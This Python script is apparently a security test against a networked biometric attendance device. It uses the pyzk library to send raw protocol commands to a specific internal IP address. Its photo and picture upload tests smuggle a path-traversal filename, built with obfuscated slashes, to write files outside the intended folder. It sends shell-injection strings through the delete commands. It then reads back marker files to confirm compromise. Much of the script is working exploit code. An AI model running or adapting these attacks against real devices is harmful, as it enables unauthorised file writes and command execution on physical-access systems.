#!/usr/bin/env python3
"""Test proper upload flow: PREPARE_DATA + DATA + UPLOAD_USERPHOTO."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def cmd_str(c):
    return '0x%04X' % (c or 0)

def upload_file(conn, upload_cmd, data):
    """Proper upload: PREPARE_DATA + DATA chunks + upload_cmd."""
    sock = conn._ZK__sock
    size = len(data)
    print('  Upload: size={}'.format(size))

    # Step 1: PREPARE_DATA with size
    r = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    print('  PREPARE_DATA:', r)
    if not r.get('status'):
        return r

    # Step 2: Send data chunks (1024 bytes each)
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    print('  Sending {} chunks of {} bytes + {} remain'.format(packets, MAX_CHUNK, remain))
    for i in range(packets):
        chunk = data[i*MAX_CHUNK:(i+1)*MAX_CHUNK]
        r = send_cmd(conn, const.CMD_DATA, chunk)
        if not r.get('status'):
            print('  DATA chunk', i, 'failed:', r)
            return r
    if remain:
        chunk = data[packets*MAX_CHUNK:]
        r = send_cmd(conn, const.CMD_DATA, chunk)
        if not r.get('status'):
            print('  DATA remain chunk failed:', r)
            return r

    # Step 3: Send upload command to commit
    r = send_cmd(conn, upload_cmd, b'')
    print('  UPLOAD command:', r)
    return r

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

# Test 1: Upload USERPHOTO with path traversal in filename
print('\n=== TEST 1: UPLOAD_USERPHOTO with path traversal ===')
TRAV = (".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "mnt" + chr(47) + "mtdblock" + chr(47) + "data" + chr(47) + "mavis_evidence.txt").encode()
test_payload = TRAV + b'\x00PWNED_BY_MAVIS_TEST_2026'
r = upload_file(conn, 0x2719, test_payload)
print('  Result:', r)

# Test 2: Upload PICTURE with path traversal
print('\n=== TEST 2: UPLOAD_PICTURE with path traversal ===')
test_payload2 = TRAV + b'\x00PWNED_PICTURE_MAVIS_TEST_2026'
r = upload_file(conn, 0x272B, test_payload2)
print('  Result:', r)

# Test 3: Normal user photo upload (sanity check)
print('\n=== TEST 3: Normal user photo (PIN=1.jpg) ===')
normal_payload = b'1.jpg\x00NORMAL_USER_PHOTO_MAVIS_TEST_2026'
r = upload_file(conn, 0x2719, normal_payload)
print('  Result:', r)

# Test 4: Read it back
print('\n=== TEST 4: DOWNLOAD_USERPHOTO PIN=1 ===')
r = send_cmd(conn, 0x271A, b'1\x00')
print('  Result:', r)

# Test 5: Try DELETE_USERPHOTO with cmd injection
print('\n=== TEST 5: DELETE_USERPHOTO with cmd injection ===')
INJECT = ('; touch /tmp/mavis_pwn_proof ;\x00').encode()
r = send_cmd(conn, 0x271B, INJECT)
print('  Result:', r)

# Test 6: Try DELETE_PICTURE with cmd injection
print('\n=== TEST 6: DELETE_PICTURE with cmd injection ===')
r = send_cmd(conn, 0x272C, INJECT)
print('  Result:', r)

# Test 7: Verify marker file via READFILE
print('\n=== TEST 7: READFILE /tmp/mavis_pwn_proof ===')
time.sleep(2)
r = send_cmd(conn, 0x6A6, b'/tmp/mavis_pwn_proof\x00')
print('  Result:', r)

# Test 8: Verify uploaded file via READFILE
print('\n=== TEST 8: READFILE /mnt/mtdblock/data/mavis_evidence.txt ===')
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/mavis_evidence.txt\x00')
print('  Result:', r)

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
